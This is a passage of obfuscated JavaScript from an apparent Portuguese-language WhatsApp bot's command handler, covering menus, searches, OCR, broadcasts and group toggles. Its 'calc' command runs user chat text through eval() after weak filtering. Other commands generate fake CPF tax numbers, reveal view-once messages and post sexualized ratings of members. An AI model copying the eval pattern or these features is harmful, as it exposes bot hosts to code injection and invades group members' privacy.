              var _0x42e5d5 = [];
              for (var _0x3d4245 = 0; _0x3d4245 < _0x75423d.length; _0x3d4245++) {
                _0x42e5d5.push({
                  'title': _0x75423d[_0x3d4245],
                  'description': "Logo personalizada: " + (_0x3d4245 + 1),
                  'rowId': _0x141936 + _0x75423d[_0x3d4245] + (" " + _0x11e99e)
                });
              }
              LGS = "LOGOS DE 1 TEXTO:\n\n";
              for (let _0x4a225e of _0x42e5d5) {
                LGS += _0x4a225e.description + "\n\nLogo: " + _0x4a225e.title + "\n\nExemplo: " + _0x4a225e.rowId + "\n\n_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-\n\n";
              }
              _0x50740b(LGS);
              break;
            case "amazon":
            case "amazonsearch":
              if (_0x11e99e.trim().length < 4) {
                return _0x50740b("Exemplo: " + (_0x141936 + _0x267d4b) + " fone redmi airdots 2");
              }
              try {
                _0x50740b(_0x50f430);
                let _0x5cb18f = await reqapi.amazon(_0x11e99e.trim());
                RST = "Pesquisa Amazon:\n\n";
                for (_0x3194f3 = 0; _0x3194f3 < (_0x5cb18f.length > 40 ? 40 : _0x5cb18f.length); _0x3194f3++) {
                  RST += "( " + (_0x3194f3 + 1) + " ) - Titulo: " + _0x5cb18f[_0x3194f3].titulo + "\n- Preço: " + _0x5cb18f[_0x3194f3].preco + "\n- Url: " + _0x5cb18f[_0x3194f3].url + "\n" + '_'.repeat(27) + "\n\n";
                }
                _0x50740b(RST);
              } catch {
                return _0x50740b("Erro, não foi possivel encontrar.");
              }
              break;
            case "pesquisa":
            case "pesquisar":
              try {
                _0xf9c182 = await reqapi.pesquisa(_0x11e99e.trim());
                const _0x3a33e7 = {
                  text: _0xf9c182.msg
                };
                const _0x5d2cc5 = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, _0x3a33e7, _0x5d2cc5);
              } catch {
                return _0x50740b("Erro..");
              }
              break;
            case "menu2":
            case "helpp":
            case "menup":
            case "comandosp":
              _0x50740b(_0x50f430);
              if (necessarioo.audiomenu) {
                const _0x219a76 = {
                  url: necessarioo.audiomenu
                };
                const _0x4314a2 = {
                  audio: _0x219a76,
                  mimetype: "audio/mpeg",
                  ptt: true
                };
                const _0x53067d = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, _0x4314a2, _0x53067d);
              }
              let _0x1f9022;
              try {
                _0x1f9022 = await _0x5196be.groupFetchAllParticipating();
              } catch (_0xaeec5f) {
                console.error("Erro ao buscar grupos:", _0xaeec5f);
                _0x1f9022 = false;
              }
              if (_0x1f9022) {
                let _0x1b1b49 = Object.values(_0x1f9022).map(_0x2af80f => _0x2af80f.id);
                let _0x4ad459 = Object.values(groupMetadata_RG).filter(_0x30a7f1 => _0x1b1b49.includes(_0x30a7f1.id));
                let _0x2b5738 = {};
                _0x4ad459.forEach(_0x5aabad => {
                  _0x2b5738[_0x5aabad.id] = _0x5aabad;
                });
                fs.writeFileSync("./DADOS/json/groups.json", JSON.stringify(_0x2b5738, null, 2));
              }
              var _0x1ffe68 = _0x257290(logo);
              const _0x3df426 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, {
                ..._0x1ffe68,
                'caption': '' + menu(_0x141936, NomeDoBot, _0x2cd689),
                'mentions': [_0x246d48]
              }, _0x3df426);
              break;
            case "ativarcmds":
            case "ativacoes":
              _0x50740b(_0x50f430);
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              var _0x24d53d = "\nAnti Link Hard: " + (_0x2b140d ? '✓' : '✕') + " \nComando: " + _0x141936 + "antilink 1 / 0\n\nAnti Notas: " + (_0x51d731 ? '✓' : '✕') + " \nComando: " + _0x141936 + "antinotas 1 / 0\n\nLimite Caracteres: " + (_0x40d1ba ? '✓' : '✕') + " \nComando: " + _0x141936 + "limitecaracteres 1 / 0\n\nAnti Fake: " + (_0x2e49b2 ? '✓' : '✕') + " \nComando: " + _0x141936 + "antifake 1 / 0\n\nAnti Catalogo: " + (_0x52e919 ? '✓' : '✕') + " \nComando: " + _0x141936 + "anticatalogo 1 / 0\n\nAnti Localização: " + (_0x2ac64a ? '✓' : '✕') + " \nComando: " + _0x141936 + "antiloc 1 / 0\n\nX9 De Cargo de ADM: " + (_0x2d5ff0 ? '✓' : '✕') + "  \nComando: " + _0x141936 + "x9 1 / 0\n\nRevelar visualização única: " + (_0xc01de ? '✓' : '✕') + " \nComando: " + _0x141936 + "x9visuunica 1 / 0\n\nModo Brincadeira: " + (_0x5c6233 ? '✓' : '✕') + " \nComando: " + _0x141936 + "modobrincadeira 1 / 0\n\nAnti Link Grupo: " + (_0x3cafb4 ? '✓' : '✕') + " \nComando: " + _0x141936 + "antilinkgp 1 / 0\n\nBem Vindo 1: " + (_0x21877a ? '✓' : '✕') + " \nComando: " + _0x141936 + "bemvindo 1 / 0\n\nBem Vindo 2: " + (_0x25178f ? '✓' : '✕') + " \nComando: " + _0x141936 + "bemvindo2 1 / 0\n\nAnti Vídeo: " + (_0x14171f ? '✓' : '✕') + " \nComando: " + _0x141936 + "antivideo 1 / 0\n\nAnti Imagem: " + (_0x2ddc0a ? '✓' : '✕') + " \nComando: " + _0x141936 + "antiimg 1 / 0\n\nAnti Áudio: " + (_0x1b617c ? '✓' : '✕') + " \nComando: " + _0x141936 + "antiaudio 1 / 0\n\nAnti Documento: " + (_0x5aaef2 ? '✓' : '✕') + " \nComando: " + _0x141936 + "antidoc 1 / 0\n\nAnti Contato " + (_0x17cef7 ? '✓' : '✕') + "\nComando: " + _0x141936 + "antictt 1 / 0\n\nAnti Sticker: " + (_0x1a72a5 ? '✓' : '✕') + " \nComando: " + _0x141936 + "antisticker 1 / 0\n\nAuto Figurinha: " + (_0x29ccfb ? '✓' : '✕') + " \nComando: " + _0x141936 + "autofigu 1 / 0\n\nSimi 1: " + (_0x785cbd ? '✓' : '✕') + " \nComando: " + _0x141936 + "simih 1 / 0\n\nAuto Resposta: " + (_0x5a94ec ? '✓' : '✕') + " \nComando: " + _0x141936 + "autorepo 1 / 0\n\nAnti Palavrão: " + (_0x627769 ? '✓' : '✕') + " \nComando: " + _0x141936 + "antipalavrao 1 / 0\n\nRecolher Link: " + (isRecolherLink ? '✓' : '✕') + " \nComando: " + _0x141936 + "recolherlink\n\n";
              const _0x5896c7 = {
                url: logoslink.logo
              };
              const _0x3d62d8 = {
                image: _0x5896c7,
                caption: _0x24d53d
              };
              const _0x317b82 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x3d62d8, _0x317b82);
              break;
            case "ativarfuncoesdono":
            case "ativacoes_dono":
              if (!_0xf59944) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              _0x50740b("\n_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_\n\n- Comando de Ativar / Desativar o bloqueador de quando ligarem pro bot, so\ndigitar o comando ligar, e denovo pra desligar: \n" + _0x141936 + "antiligar \n\n- Comando para ativar ou desativar o visualizador de mensagem, visualizar\nmensagem de tudo, so digitar o comando pra ligar, e o comando novamente pra\ndesligar: \n" + _0x141936 + "visualizarmsg\n\n- Comando de desativar o que mostra comandos dados no console, so digitar o\ncomando 1 vez ora ativar, e digitar o comando novamente pra desativar:\n" + _0x141936 + "console\n\n- Comando para ativar o bloqueador de quando algum usuário mande mensagem\nprivado do bot, seja bloqueado, o comando usado 1 vez, ele ativa, usado\nnovamente ele desativar:\n" + _0x141936 + "antipv\n\n- Comando de falar que não pode mandar mensagem privado, para alterar a\nmensagem, so usar o comando " + _0x141936 + "msgantipv e coloque o que quer, para ativar\no comando é digitar ele uma vez, e digitar novamente para desativar: \n" + _0x141936 + "antipv2\n\n- Comando de ativar e desativar o audio do menu:\n" + _0x141936 + "audio-menu\n\n- Comando de ativar e desativar o verificado de marcação: \n" + _0x141936 + "verificado-global\n\n- Comando de desativar o bot completamente para ninguém usar:\n" + _0x141936 + "botoff\n\n- Comando de funcionar só comandos pra administrador:\n" + _0x141936 + "So_Adm\n\n- Comando para recolher link de grupos que o bot estiver:\n" + _0x141936 + "recolherlink\n\n_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_\n");
              break;
            case "verificado-global":
              if (!_0xf59944) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              if (!_0x2ba8b9) {
                nescessario.verificado = true;
                _0x13c255(nescessario);
                _0x50740b("- O Verificado foi Ativado de todos os comandos que tem, para tirar novamente só digitar o comando novamente..");
              } else {
                if (_0x2ba8b9) {
                  nescessario.verificado = false;
                  _0x13c255(nescessario);
                  _0x50740b("- O Verificado de todos os menu / comando, foi Desativado, para ativar novamente só digitar o comando novamente..");
                }
              }
              break;
            case "audio-menu":
              if (!_0xf59944) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              if (!_0x5545fb) {
                nescessario.menu_audio = true;
                _0x13c255(nescessario);
                _0x50740b("- O Áudio foi ativado para o menu _- COM SUCESSO - _\n\nSe quiser Desativar - Só digitar o comando novamente");
              } else if (_0x5545fb) {
                nescessario.menu_audio = false;
                _0x13c255(nescessario);
                _0x50740b("- O Áudio foi Desativado do menu _- COM SUCESSO - _\n\nSe quiser Ativar - Só digitar o comando novamente");
              }
              break;
            case "console":
              if (!_0xf59944) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              if (!_0x4a11c3) {
                nescessario.consoleoff = true;
                _0x13c255(nescessario);
                _0x50740b("- O comando de tirar o console foi ativado _- COM SUCESSO - _ Agora não verá mais os comandos nem mensagem dadas no console, mas funcionará perfeitamente, ok?, é bom para evitar banimento de spam no heroku.\n\nSe quiser Desativar - Só digitar o comando novamente");
              } else {
                if (_0x4a11c3) {
                  nescessario.consoleoff = false;
                  _0x13c255(nescessario);
                  _0x50740b("- O comando de tirar o console foi Desativado  _- COM SUCESSO - _ Agora verá os comandos e mensagens dadas no console, mas se for utilizar no heroku, recomendo ativar. é bom para evitar banimento de spam no heroku.\n\nSe quiser Ativar - Só digitar o comando novamente");
                }
              }
              break;
            case "logos":
            case "menulogo":
            case "menulogos":
              _0x50740b(_0x50f430);
              var _0x1ffe68 = _0x257290(logolg);
              const _0x447cda = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, {
                ..._0x1ffe68,
                'caption': menulogos(_0x141936, _0x2cd689),
                'mentions': [_0x246d48]
              }, _0x447cda);
              break;
            case "menuadm":
            case "menuadms":
            case "adm":
              if (!_0x3f2f63) {
                return _0x50740b("Somente Administradores Do Grupo Podem Ver O Menu De Admins");
              }
              _0x50740b(_0x50f430);
              var _0x1ffe68 = _0x257290(logoadm);
              const _0x58099c = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, {
                ..._0x1ffe68,
                'caption': adms(_0x141936, _0x2cd689),
                'mentions': [_0x246d48]
              }, _0x58099c);
              break;
            case "owner":
            case "odono":
            case "dono":
            case "infodono":
              _0x50740b(_0x50f430);
              numerodn = numerodono_ofc;
              var _0x1ffe68 = _0x257290(logopro);
              const _0x3351cc = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, {
                ..._0x1ffe68,
                'caption': infodono(_0x141936, numerodn, NomeDoBot, NickDono, _0x2cd689),
                'mentions': [_0x246d48]
              }, _0x3351cc);
              break;
            case "menudono":
            case "donomenu":
              if (!_0xf59944 && !issupre) {
                return _0x50740b("SOMENTE O DONO DO BOT PODE PEDI O MENU DO DONO");
              }
              _0x50740b(_0x50f430);
              var _0x1ffe68 = _0x257290(logodn);
              const _0x582fc1 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, {
                ..._0x1ffe68,
                'caption': menudono(_0x141936, _0x2cd689),
                'mentions': [_0x246d48]
              }, _0x582fc1);
              break;
            case "menugold":
            case "menugolds":
              {
                if (!_0x89cd51) {
                  return _0x50740b("Este comando só deve ser utilizado em Grupos.");
                }
                if (!_0x33d21e) {
                  return _0x50740b("Este comando só pode ser utilizado quando o sistema " + _0x141936 + "sistemgold 1 está ativado.");
                }
                _0x50740b(_0x50f430);
                let _0x410927 = '';
                if (_0x326cbd[0]?.["comandos_gold"]) {
                  for (ah of _0x326cbd[0].comandos_gold) {
                    _0x410927 += "┆    ║" + _0x2cd689 + "️  " + (_0x141936 + ah.comando) + "\n┆    ║" + _0x2cd689 + "️  consumindo: " + ah.gold + "\n┆    ║" + _0x2cd689 + "️ " + '-'.repeat(25) + "\n";
                  }
                }
                var _0x1ffe68 = _0x257290(logogold);
                const _0x16acbc = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, {
                  ..._0x1ffe68,
                  'caption': menugold(_0x141936, _0x2cd689, _0x410927, _0x671b4b),
                  'mentions': [_0x246d48]
                }, _0x16acbc);
              }
              break;
            case "efeitosimg":
            case "efeitos":
            case "efeitoimg":
            case "efeitosmarcar":
            case "menuefeitos":
              _0x50740b(_0x50f430);
              var _0x1ffe68 = _0x257290(logoefe);
              const _0x3ca481 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, {
                ..._0x1ffe68,
                'caption': efeitos(_0x141936, _0x2cd689),
                'mentions': [_0x246d48]
              }, _0x3ca481);
              break;
            case "alteradores":
              _0x50740b(_0x50f430);
              var _0x1ffe68 = _0x257290(logoalt);
              const _0x235c98 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, {
                ..._0x1ffe68,
                'caption': alteradores(_0x141936, _0x2cd689),
                'mentions': [_0x246d48]
              }, _0x235c98);
              break;
            case "brincadeiras":
            case "brincadeira":
              if (!_0x5c6233) {
                return _0x50740b("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite " + _0x141936 + "modobrincadeira 1");
              }
              _0x50740b(_0x50f430);
              var _0x1ffe68 = _0x257290(logobr);
              const _0x958394 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, {
                ..._0x1ffe68,
                'caption': brincadeiras(_0x141936, _0x2cd689),
                'mentions': [_0x246d48]
              }, _0x958394);
              break;
            case "menupremium":
            case "menuprem":
              if (!_0x33286a) {
                return _0x50740b("Apenas premium..");
              }
              _0x50740b(_0x50f430);
              var _0x1ffe68 = _0x257290(logopre);
              const _0x44615b = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, {
                ..._0x1ffe68,
                'caption': menuprem(_0x141936, _0x2cd689),
                'mentions': [_0x246d48]
              }, _0x44615b);
              break;
            case "menufig":
              _0x50740b(_0x50f430);
              var _0x1ffe68 = _0x257290(logofig);
              const _0x1a0e62 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, {
                ..._0x1ffe68,
                'caption': menufig(_0x141936, _0x2cd689),
                'mentions': [_0x246d48]
              }, _0x1a0e62);
              break;
            case "menuanime":
              _0x50740b(_0x50f430);
              var _0x1ffe68 = _0x257290(logoanime);
              const _0x2378c2 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, {
                ..._0x1ffe68,
                'caption': menuanime(_0x141936, NomeDoBot, _0x2cd689),
                'mentions': [_0x246d48]
              }, _0x2378c2);
              break;
            case "menu18":
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18 1");
              }
              _0x50740b(_0x50f430);
              var _0x1ffe68 = _0x257290(logo18);
              const _0x31e260 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, {
                ..._0x1ffe68,
                'caption': menux(_0x141936, _0x2cd689),
                'mentions': [_0x246d48]
              }, _0x31e260);
              break;
            case "menudw":
              _0x50740b(_0x50f430);
              var _0x1ffe68 = _0x257290(logopd);
              const _0x15659b = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, {
                ..._0x1ffe68,
                'caption': menudw(_0x141936, _0x2cd689),
                'mentions': [_0x246d48]
              }, _0x15659b);
              break;
            case "criador":
              vcard = "BEGIN:VCARD\nVERSION:3.0\nFN:🚸⃪֟፝🎡⃞꛰𝐋𝐨𝐭𝐮𝐬᭄❀⃯ ⃝⃔🇯🇵\nORG:Bot developer WA;\nTEL;type=CELL;type=VOICE;waid=5521995400244:+55 21 99540-0244\nX-WA-BIZ-NAME:🚸⃪֟፝🎡⃞꛰𝐋𝐨𝐭𝐮𝐬᭄❀⃯ ⃝⃔🇯🇵⁩\nX-WA-BIZ-DESCRIPTION:criador do bot.\nEND:VCARD";
              const _0x3536f6 = {
                vcard: vcard
              };
              const _0x7f89c5 = {
                displayName: '' + NomeDoBot,
                contacts: [_0x3536f6]
              };
              const _0x585784 = {
                contacts: _0x7f89c5
              };
              inff = await _0x5196be.sendMessage(_0x346d97, _0x585784);
              _0x50740b(_0x50f430);
              const _0x5ded98 = {
                url: logocri.url
              };
              const _0x958dba = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, {
                'image': _0x5ded98,
                'caption': criador(_0x141936, NomeDoBot)
              }, _0x958dba);
              break;
            case "configurar-bot":
              const _0x16f457 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, {
                'text': configbot(_0x141936, _0x2cd689)
              }, _0x16f457);
              break;
            case "comandos-termux":
              const _0x74aeb2 = {
                text: "\n_-_-_-_-_-_-_-_-_\n\npara obter o arquivo do bot fale com o lotus: wa.me/5521995400244\n\n_-_-_-_-_-_-_-_-_\n"
              };
              const _0x297385 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x74aeb2, _0x297385);
              break;
            case "perfil":
              {
                _0x50740b(_0x50f430);
                try {
                  ppimg2 = await _0x5196be.profilePictureUrl(_0x246d48.split('@')[0] + "@c.us", "image");
                } catch {
                  ppimg2 = "https://telegra.ph/file/b5427ea4b8701bc47e751.jpg";
                }
                try {
                  var _0x1e9a89 = palavrasc[Math.floor(Math.random() * palavrasc.length)];
                  let _0x26bd72 = ['1', '2', '3', '4', '5', '6', '7', '8', '9'];
                  let _0x2ab03c = ['1', '2', '3', '4', '5', '6', '7', '8', '9'];
                  let _0x55c1b9 = _0x26bd72[Math.floor(Math.random() * _0x26bd72.length)];
                  let _0x29816d = _0x2ab03c[Math.floor(Math.random() * _0x2ab03c.length)];
                  let _0x162434 = ['1', '2', '3', '4', '5', '6', '7', '8', '9'];
                  let _0x22cfbb = ['1', '2', '3', '4', '5', '6', '7', '8', '9'];
                  let _0x402d67 = _0x162434[Math.floor(Math.random() * _0x162434.length)];
                  let _0x37f407 = _0x22cfbb[Math.floor(Math.random() * _0x22cfbb.length)];
                  let _0x3608c3 = ['1', '2', '3', '4', '5', '6', '7', '8', '9'];
                  let _0x4f9f23 = ['1', '2', '3', '4', '5', '6', '7', '8', '9'];
                  let _0x30f431 = _0x3608c3[Math.floor(Math.random() * _0x3608c3.length)];
                  let _0x3d2d0a = _0x4f9f23[Math.floor(Math.random() * _0x4f9f23.length)];
                  let _0x305056 = Math.ceil(Math.random() * 10000);
                  let _0x295003 = JSON.parse(fs.readFileSync("./DADOS/json/cmdperfil.json", "utf8"));
                  function _0x5145d5(_0x54e1d1) {
                    return _0x295003.emojis[_0x54e1d1];
                  }
                  function _0x13d98f() {
                    let _0x6f8453 = Object.keys(_0x295003.elementosPerfil);
                    let _0x20e99b = [];
                    _0x6f8453.sort(() => Math.random() - 0.5);
                    let _0x5c4a95 = _0x6f8453.slice(0, 5);
                    _0x5c4a95.forEach(_0x21437b => {
                      let _0x8b7c74 = _0x295003.elementosPerfil[_0x21437b][Math.floor(Math.random() * _0x295003.elementosPerfil[_0x21437b].length)];
                      let _0x302062 = _0x295003.emojis[_0x21437b];
                      let _0x4b3767 = '*' + _0x21437b + '*';
                      _0x20e99b.push(_0x302062 + " " + _0x4b3767 + ": " + _0x8b7c74);
                    });
                    return _0x20e99b;
                  }
                  let _0xaa96dd = _0x13d98f();
                  let _0x4a3537 = _0xaa96dd.join("\n");
                  let _0x2763e8 = "           「 🔥 ~_*PERFIL*_~ 🌈 」\n🗒 *Nome* : *" + _0x671b4b + "*\n🪀 *Número* : @" + _0x45b1c6 + "\n🐂 *Nível gado* : *" + _0x55c1b9 + _0x29816d + "%*\n📱 *Seu Célular* : " + (_0xd2050d.key.id.length > 21 ? "Android 🤣" : _0xd2050d.key.id.substring(0, 2) == '3A' ? "IOS😂😂😅" : "Zap zap web 😂😂☝🏼😅") + "\n😈 *Nível puta* : *" + _0x402d67 + _0x37f407 + "%*\n😋 *Nível de gostosura* : *" + _0x30f431 + _0x3d2d0a + "%*\n🍼 *Valor do programa* : *R$" + _0x305056 + "*\n" + _0x4a3537 + "\n\n➻ *~_CONSELHO_~* :\n" + _0x1e9a89;
                  const _0x3fc732 = {
                    url: ppimg2
                  };
                  const _0x208688 = {
                    image: _0x3fc732,
                    caption: _0x2763e8,
                    mentions: [_0x246d48]
                  };
                  const _0x5d18a1 = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x208688, _0x5d18a1);
                } catch (_0x94be6f) {
                  console.log(_0x94be6f);
                }
              }
              break;
            case "conselhobiblico":
            case "conselhosbiblico":
            case "conselhosb":
            case "conselhob":
              var _0x51b2a9 = conselhob[Math.floor(Math.random() * conselhob.length)];
              jr = _0x33c0c0 + " " + _0x671b4b + " \n\nConselhos Bíblico para você: \n\n- " + _0x51b2a9 + " \n\n> Bot: " + NomeDoBot + "\n> Grupo: " + _0x3baffe;
              const _0x2b9188 = {
                text: jr
              };
              const _0x4c973e = {
                mentionedJid: jr
              };
              const _0x2be5d2 = {
                quoted: _0xd2050d,
                contextInfo: _0x4c973e
              };
              _0x5196be.sendMessage(_0x346d97, _0x2b9188, _0x2be5d2);
              break;
            case "mediafire":
              try {
                if (!_0x11e99e.includes("mediafire.com")) {
                  return _0x50740b("Faltando o link do mediafire para download do arquivo, cade?");
                }
                let _0x36150d = await reqapi.mediafire(_0x11e99e.trim());
                _0x50740b("Enviando: " + _0x36150d.resultado[0].nama + "\n\nPeso: " + _0x36150d.resultado[0].size);
                const _0x50ca37 = {
                  url: _0x36150d.resultado[0].link
                };
                _0x5196be.sendMessage(_0x346d97, {
                  'document': _0x50ca37,
                  'mimetype': "application/" + _0x36150d.resultado[0].mime,
                  'fileName': _0x36150d.resultado[0].nama
                })["catch"](_0x3a4323 => {
                  return _0x50740b("Erro..");
                });
              } catch (_0x148ccb) {
                return _0x50740b("Erro..");
              }
              break;
            case "test":
              _0x5196be.sendMessage(_0x346d97, {});
              break;
            case "ler":
            case "ocr":
            case "lerfoto":
              if ((_0x39e519 && !_0xd2050d.message.videoMessage || _0x54198a) && !_0x11e99e.length <= 1) {
                encmedia = _0x54198a ? _0xd2050d.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : _0xd2050d.message.imageMessage;
                rane = getRandom('.' + (await getExtension(encmedia.mimetype)));
                buffimg = await getFileBuffer(encmedia, "image");
                fs.writeFileSync(rane, buffimg);
                media = rane;
                _0x50740b(_0x50f430);
                await recognize(media, {
                  'lang': "eng+ind",
                  'oem': 0x1,
                  'psm': 0x3
                }).then(_0x369a51 => {
                  _0x50740b(_0x369a51.trim());
                  DLT_FL(media);
                })["catch"](_0x219497 => {
                  _0x50740b(_0x219497.message);
                  DLT_FL(media);
                });
              } else {
                _0x50740b("Somente fotos!");
              }
              break;
            case "getquoted":
            case "getinfo":
            case "get":
              if (!_0x3eefd0) {
                return;
              }
              _0x50740b(JSON.stringify(_0xd2050d.message.extendedTextMessage.contextInfo, null, 3));
              break;
            case "get-txt":
              _0x50740b(JSON.stringify(_0xd2050d.message.extendedTextMessage.contextInfo.quotedMessage.conversation, null, 2));
              break;
            case "gerarcpf":
              cp1 = '' + (Math.floor(Math.random() * 300) + 600);
              cp2 = '' + (Math.floor(Math.random() * 300) + 600);
              cp3 = '' + (Math.floor(Math.random() * 300) + 600);
              cp4 = '' + (Math.floor(Math.random() * 30) + 60);
              cpf = cp1 + '.' + cp2 + '.' + cp3 + '-' + cp4;
              const _0x310605 = {
                text: "CPF gerado com sucesso : " + cpf
              };
              const _0x4554ca = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x310605, _0x4554ca);
              break;
            case "cep":
              try {
                if (!_0x11e99e.trim()) {
                  return _0x50740b("digite o CEP que deseja buscar informações..");
                }
                let _0x48db44 = await reqapi.cep(_0x11e99e.trim());
                _0x50740b("Cep: " + _0x48db44.cep + "\nRua: " + _0x48db44.rua + "\nComplemento:\n" + _0x48db44.complemento + "\nBairro: " + _0x48db44.vizinhança + "\nCidade: " + _0x48db44.cidade + "\nEstado:\n" + _0x48db44.estado + "\nGia: " + _0x48db44.gia + "\nIbge: " + _0x48db44.ibge + "\nddd: " + _0x48db44.ddd + "\nSiafi:\n" + _0x48db44.siafi);
              } catch (_0x4738f2) {
                return _0x50740b("Erro..");
              }
              break;
            case "ddd":
              if (_0x23d865.length < 1) {
                return _0x50740b("Use " + (_0x141936 + _0x267d4b) + " 81");
              }
              ddd = _0x3ac611.slice(5);
              ddds = await axios.get("https://brasilapi.com.br/api/ddd/v1/" + ddd);
              dddlist = "Lista de Cidades de " + ddds.data.state + " com este DDD " + _0x11e99e + ">\n\n";
              for (let _0x379d59 = 0; _0x379d59 < ddds.data.cities.length; _0x379d59++) {
                dddlist += _0x379d59 + 1 + " ⪧ *" + ddds.data.cities[_0x379d59] + "*\n";
              }
              const _0x5228fc = {
                text: dddlist
              };
              const _0x5e698c = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x5228fc, _0x5e698c);
              break;
            case "encurtalink":
              if (_0x23d865.length < 1) {
                return _0x50740b("Exemplo:\n" + _0x141936 + "encurtalink https://youtube.com/c/aleatoryconteudos");
              }
              try {
                _0x24e1d3 = _0x23d865[0];
                anu = await axios.get("https://tinyurl.com/api-create.php?url=" + _0x24e1d3);
                _0x50740b('' + anu.data);
              } catch (_0x31ea72) {
                emror = String(_0x31ea72);
                _0x50740b('' + _0x31ea72);
              }
              break;
            case "calculadora":
            case "calcular":
            case "calc":
              rsp = _0x11e99e.replace('x', '*').replace("\"", ':').replace(new RegExp("[()abcdefghijklmnopqrstwuvxyz]", 'gi'), '').replace('÷', '/');
              return _0x50740b(JSON.stringify(eval(rsp, null, "\t")));
              break;
            case "listatm":
              if (!_0xf59944) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              if (rgp.length == 0) {
                return _0x50740b("Não contém nenhum registro de transmissão, utilize " + _0x141936 + "rgtm no grupo que deseja que ele receba as transmissões do bot..");
              }
              bl = "_-_-_-_-_-_-_-_-_-_-_-_-\n\n";
              for (_0x3194f3 = 0; _0x3194f3 < rgp.length; _0x3194f3++) {
                bl += _0x3194f3 + 1 + " - ID: " + rgp[_0x3194f3].id + "\n\n- NOME DO USUÁRIO OU GRUPO: " + rgp[_0x3194f3].infonome + "\n\n";
              }
              _0x50740b(bl);
              break;
            case "rgtm":
              if (!_0xf59944) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              if (JSON.stringify(rgp).includes(_0x346d97)) {
                return _0x50740b("Este grupo ja está registrado na lista de transmissão");
              }
              const _0x576163 = {
                id: _0x346d97,
                infonome: '' + (_0x89cd51 ? _0x3baffe : _0x671b4b)
              };
              rgp.push(_0x576163);
              fs.writeFileSync("./DADOS/json/TMGP.json", JSON.stringify(rgp));
              _0x50740b("Registrado com sucesso, quando for realizada as transmissões, esse grupo/usuário estará na lista.");
              break;
            case "tirardatm":
              if (!_0xf59944) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              if (!JSON.stringify(rgp).includes(_0x346d97)) {
                return _0x50740b("Este grupo não está registrado para ser tirado da lista de transmissão");
              }
              if (_0x11e99e.trim().length > 4) {
                var _0x504ad6 = rgp.map(_0x4248fa => _0x4248fa.id).indexOf(_0x11e99e.trim());
              } else {
                var _0x504ad6 = rgp.map(_0x5b4584 => _0x5b4584.id).indexOf(_0x346d97);
              }
              rgp.splice(_0x504ad6, 1);
              fs.writeFileSync("./DADOS/json/TMGP.json", JSON.stringify(rgp));
              _0x50740b("Grupo/Usuário tirado da lista de transmissão com sucesso");
              break;
            case "fazertm":
              if (!_0xf59944) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              if (rgp.lengh == 0) {
                return _0x50740b("Não contém nenhum grupo registrado para realizar transmissão");
              }
              await sleep(1000);
              let _0x176a38 = '';
              var _0x2002e6 = _0xd2050d.message?.["extendedTextMessage"]?.["contextInfo"]?.["quotedMessage"];
              var _0x47b60a = _0x54198a ? _0x2002e6?.["imageMessage"] : _0xd2050d.message?.["imageMessage"];
              var _0x37575f = _0xee3727 ? _0x2002e6?.["videoMessage"] : _0xd2050d.message?.["videoMessage"];
              var _0x533342 = _0x101cab ? _0x2002e6?.["textMessage"] : _0xd2050d.message?.["textMessage"];
              var _0x417249 = _0x47f03c ? _0x2002e6?.["documentMessage"] : _0xd2050d.message?.["documentMessage"];
              var _0x25e12d = _0x210554 ? _0x2002e6?.["documentWithCaptionMessage"]?.["message"]?.["documentMessage"] : _0xd2050d.message?.["documentWithCaptionMessage"]?.["message"]?.["documentMessage"];
              var _0x843d9b = _0x2f2cdc ? _0x2002e6.audioMessage : '';
              var _0x15d9f3 = _0x309ffb ? _0x2002e6.stickerMessage : '';
